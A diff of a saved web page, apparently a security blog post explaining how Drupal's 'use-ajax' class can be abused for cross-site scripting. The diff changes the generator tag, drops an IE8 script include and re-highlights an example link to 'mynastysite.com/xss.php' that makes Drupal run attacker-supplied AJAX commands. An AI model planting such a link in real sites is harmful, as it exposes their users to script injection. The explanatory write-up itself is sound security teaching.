@@ -17,7 +17,7 @@
 <meta property="article:tag" content="security" />
 <meta property="article:published_time" content="2017-05-28T15:52:44+00:00" />
 <meta property="article:modified_time" content="2020-01-27T17:48:12+00:00" />
-<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
+<meta name="Generator" content="Drupal 9 (https://www.drupal.org)" />
 <meta name="MobileOptimized" content="width" />
 <meta name="HandheldFriendly" content="true" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -30,10 +30,6 @@
 <link rel="stylesheet" media="all" href="/sites/default/files/css/css_aJtxriRLrEwAZyO9ZA7uY_urt5YbrE8-bENSChMdo1o.css" />
 
     
-<!--[if lte IE 8]>
-<script src="/sites/default/files/js/js_VtafjXmRvoUgAzqzYTA3Wrjkx9wcWhjP0G4ZnnqRamA.js"></script>
-<![endif]-->
-
   </head>
   <body>
     <a href="#main-content" class="visually-hidden focusable">
@@ -79,7 +75,7 @@
 <li>The AJAX system automatically binds on elements with the “use-ajax” class</li>
 </ol><p>Knowing this, we can make a comment like this:</p>
 <figure><pre>
-<code data-lang="html" class=" hljs javascript">&lt;a href=<span class="hljs-string">"http://mynastysite.com/xss.php"</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">"use-ajax"</span>&gt;Click me!<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></code></pre></figure><p>and know that when the link is clicked, a POST request is made to an arbitrary URL, and Drupal will parse the response and process AJAX commands.</p>
+<code data-lang="html" class=" hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://mynastysite.com/xss.php"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"use-ajax"</span>&gt;</span>Click me!<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre></figure><p>and know that when the link is clicked, a POST request is made to an arbitrary URL, and Drupal will parse the response and process AJAX commands.</p>
 <p>The xss.php script on our endpoint could look something like this:</p>
 <figure><pre>
 <code data-lang="php" class=" hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>
